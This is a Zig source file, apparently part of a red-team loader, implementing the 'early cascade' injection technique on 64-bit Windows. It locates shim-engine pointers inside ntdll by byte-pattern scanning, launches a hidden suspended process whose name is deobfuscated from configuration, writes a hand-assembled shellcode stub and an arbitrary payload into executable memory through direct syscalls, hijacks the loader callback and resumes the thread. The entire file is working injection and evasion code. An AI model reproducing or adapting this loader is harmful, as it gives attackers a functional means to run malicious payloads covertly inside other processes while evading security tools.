const std = @import("std");
const windows = std.os.windows;
const config = @import("config");
const Apis = @import("../api.zig").Apis;
const Syscalls = @import("../syscall.zig").Syscalls;
const win32 = @import("../win32.zig");
const deobfsBytes = @import("../helper/obfs.zig").deobfsBytes;
const mem = @import("../helper/mem.zig");

// Ref: https://github.com/0xsp-SRD/0xsp.com/blob/main/cascade_injection/src/main.zig#L388
fn resolvePointers(apis: Apis) struct { se_dll_loaded: ?windows.PVOID, shims_enabled: ?windows.PVOID } {
    var tmp = apis.RtlQueryDepthSList.?;

    var i: usize = 0;
    const max_scan = 4096 * 128; // Safety limit
    var scan_count: usize = 0;

    // scan until end of LdrpInitShimEngine (looking for either cc c3 or c3 cc)
    while (i != 2 and scan_count < max_scan) : (scan_count += 1) {
        const current = @as(*align(1) const u16, @ptrCast(tmp)).*;
        // std.debug.print("current: 0x{x}\n", .{current});
        if (current == 0xc3cc or current == 0xccc3) { //first scan pattern should be c3cc and ccc3 but we need to check both
            i += 1;
            // std.debug.print("[+] Found end pattern {} at 0x{x}\n", .{ i, @intFromPtr(tmp) });
        }
        tmp = @ptrFromInt(@intFromPtr(tmp) + 1);
    }
    if (scan_count >= max_scan) {
        // std.debug.print("[-] Failed to find LdrpInitShimEngine end\n", .{});
        return .{ .se_dll_loaded = null, .shims_enabled = null };
    }

    // Find g_pfnSE_DllLoaded pattern
    scan_count = 0;
    // scan until 0x488b3d: mov rdi, qword [rel g_pfnSE_DllLoaded]
    while ((@as(*align(1) const u32, @ptrCast(tmp)).* & 0xFFFFFF) != 0x3d8b48 and scan_count < max_scan) : (scan_count += 1) {
        // std.debug.print("tmp: 0x{x}\n", .{ @as(*align(1) const u32, @ptrCast(tmp)).* & 0xFFFFFF });
        tmp = @ptrFromInt(@intFromPtr(tmp) + 1);
    }
    if (scan_count >= max_scan) {
        // std.debug.print("[-] Failed to find g_pfnSE_DllLoaded pattern\n", .{});
        return .{ .se_dll_loaded = null, .shims_enabled = null };
    }

    // g_pfnSE_DllLoaded offset
    const offset1 = @as(*align(1) const u32, @ptrCast(@as([*]const u8, @ptrCast(tmp)) + 3)).*;
    const g_pfn_se_dll_loaded = @as(*u8, @ptrFromInt(@intFromPtr(tmp) + offset1 + 7));

    scan_count = 0;
    // scan until 0x443825: cmp byte [rel g_ShimsEnabled], r12b
    while ((@as(*align(1) const u32, @ptrCast(tmp)).* & 0xFFFFFF) != 0x253844 and scan_count < max_scan) : (scan_count += 1) {
        // std.debug.print("tmp: 0x{x}\n", .{ @as(*align(1) const u32, @ptrCast(tmp)).* & 0xFFFFFF });
        tmp = @ptrFromInt(@intFromPtr(tmp) + 1);
    }

    if (scan_count >= max_scan) {
        // std.debug.print("[-] Failed to find g_ShimsEnabled pattern\n", .{});
        return .{ .se_dll_loaded = null, .shims_enabled = null };
    }

    // g_ShimsEnabled offset
    const offset2 = @as(*align(1) const u32, @ptrCast(@as([*]const u8, @ptrCast(tmp)) + 3)).*;
    const g_shims_enabled = @as(*u8, @ptrFromInt(@intFromPtr(tmp) + offset2 + 7));

    // std.debug.print("[i] g_ShimsEnabled:    0x{x}\n", .{@intFromPtr(g_shims_enabled)});
    // std.debug.print("[i] g_pfnSE_DllLoaded: 0x{x}\n", .{@intFromPtr(g_pfn_se_dll_loaded)});

    return .{
        .se_dll_loaded = g_pfn_se_dll_loaded,
        .shims_enabled = g_shims_enabled,
    };
}

// Ref: https://github.com/0xsp-SRD/0xsp.com/blob/main/cascade_injection/src/main.zig#L305
fn sysEncodeFnPointer(fn_pointer: windows.PVOID) windows.PVOID {
    const shared_user_cookie = @as(*const u32, @ptrFromInt(0x7FFE0330)).*;
    const encoded = std.math.rotr(u64, @as(u64, shared_user_cookie) ^ @intFromPtr(fn_pointer), @as(u6, @intCast(shared_user_cookie & 0x3F)));
    return @ptrFromInt(@as(usize, @intCast(encoded)));
}

// Ref: https://github.com/0xsp-SRD/0xsp.com/blob/main/cascade_injection/src/main.zig
pub fn cascade(apis: Apis, syscalls: Syscalls, payload: []const u8) !void {
    // Resolve pointers for g_SE_DllLoaded and g_ShimsEnabled
    const pointers = resolvePointers(apis);
    const g_pfn_se_dll_loaded = pointers.se_dll_loaded;
    const g_shims_enabled = pointers.shims_enabled;

    if (g_pfn_se_dll_loaded == null or g_shims_enabled == null) {
        // std.debug.print("PointersNotFound\n", .{});
        return error.PointersNotFound;
    }

    // Only x86_64 supported
    var cascade_stub_x64 = [_]u8{
        0x48, 0x83, 0xec, 0x38,                          // sub rsp, 38h
        0x33, 0xc0,                                      // xor eax, eax
        0x45, 0x33, 0xc9,                                // xor r9d, r9d
        0x48, 0x21, 0x44, 0x24, 0x20,                    // and [rsp+38h+var_18], rax

        0x48, 0xba,                                      // 
        0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99,  // mov rdx, 9999999999999999h <- The address will be replaced with the address of shellcode.

        0xa2,                                            // (offset: 25)
        0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88,  // mov ds:8888888888888888h, al <- *g_ShimsEnabled = FALSE. The adress will be replaced with the address of g_ShimsEnabled.

        0x49, 0xb8,                                      // 
        0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77,  // mov r8, 7777777777777777h <- The address will be replaced with the address of context if needed.

        0x48, 0x8d, 0x48, 0xfe,                          // lea rcx, [rax-2]

        0x48, 0xb8,                                      // 
        0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66,  // mov rax, 6666666666666666h <- The address will be replaced with the address of NtQueueApcThread.

        0xff, 0xd0,                                      // call rax
        0x33, 0xc0,                                      // xor eax, eax
        0x48, 0x83, 0xc4, 0x38,                          // add rsp, 38h
        0xc3                                             // retn
    };

    // Get target process
    const process_name = deobfsBytes(
        config.target_process_name_obfs.len,
        config.target_process_name_obfs,
        config.obfs_key,
    );
    const command_line = process_name[0..process_name.len];

    var si = win32.STARTUPINFOA{
        .cb = @sizeOf(win32.STARTUPINFOA),
        .lpReserved = null,
        .lpDesktop = null,
        .lpTitle = null,
        .dwX = 0,
        .dwY = 0,
        .dwXSize = 0,
        .dwYSize = 0,
        .dwXCountChars = 0,
        .dwYCountChars = 0,
        .dwFillAttribute = 0,
        .dwFlags = windows.STARTF_USESHOWWINDOW,
        .wShowWindow = win32.SW_HIDE,
        .cbReserved2 = 0,
        .lpReserved2 = null,
        .hStdInput = null,
        .hStdOutput = null,
        .hStdError = null,
    };
    var pi: windows.PROCESS_INFORMATION = undefined;

    // Create a suspended process
    const result = apis.CreateProcessA.?(
        null,
        @constCast(@ptrCast(command_line)),
        null,
        null,
        windows.FALSE,
        win32.CREATE_SUSPENDED,
        null,
        null,
        &si,
        &pi,
    );
    if (result == windows.FALSE) {
        return error.CreateProcessAFailed;
    }

    defer _ = mem.ntClose(syscalls, pi.hProcess);
    defer _ = mem.ntClose(syscalls, pi.hThread);

    // Allocate memory in remote process
    const alloc_size = cascade_stub_x64.len + payload.len;

    const remote_buf = try mem.ntAlloc(
        syscalls,
        pi.hProcess,
        alloc_size,
        windows.MEM_RESERVE | windows.MEM_COMMIT,
        windows.PAGE_EXECUTE_READWRITE,
    );
    defer _ = mem.ntFree(syscalls, remote_buf);

    // Copy the address of payload
    const payload_addr: usize = @intFromPtr(remote_buf.ptr) + cascade_stub_x64.len;
    @memcpy(cascade_stub_x64[16..24].ptr, std.mem.asBytes(&payload_addr));

    // Copy the address of g_shims_enabled
    @memcpy(cascade_stub_x64[25..33].ptr, std.mem.asBytes(&g_shims_enabled));

    // 
    // g_value = payload_addr + payload.len;
    // @memcpy(cascade_stub_x64[35..43].ptr, std.mem.asBytes(&g_value));

    // Copy the address of NtQueueApcThread
    const ntqueue_ptr: usize = @intFromPtr(apis.NtQueueApcThread.?);
    @memcpy(cascade_stub_x64[49..57].ptr, std.mem.asBytes(&ntqueue_ptr));

    // Write the cascade stub
    try mem.ntWrite(syscalls, pi.hProcess, remote_buf.ptr, cascade_stub_x64[0..cascade_stub_x64.len]);

    // Write payload
    try mem.ntWrite(syscalls, pi.hProcess, @ptrFromInt(@intFromPtr(remote_buf.ptr) + cascade_stub_x64.len), payload);

    // Set the encoded callback pointer to the cascade stub
    const callback_ptr: usize = @intFromPtr(sysEncodeFnPointer(remote_buf.ptr));
    try mem.ntWrite(syscalls, pi.hProcess, g_pfn_se_dll_loaded.?, std.mem.asBytes(&callback_ptr));

    // Write shim_enabled value
    const shim_enabled_value: u8 = 1; // true
    try mem.ntWrite(syscalls, pi.hProcess, g_shims_enabled.?, &[_]u8{shim_enabled_value});

    // try mem.ntProtect(syscalls, pi.hProcess, g_pfn_se_dll_loaded.?, @sizeOf(usize), windows.PAGE_READWRITE);
    // std.debug.print("ntProtect ok\n", .{});

    // Resume the thread
     mem.ntResumeThread(syscalls, pi.hThread);
}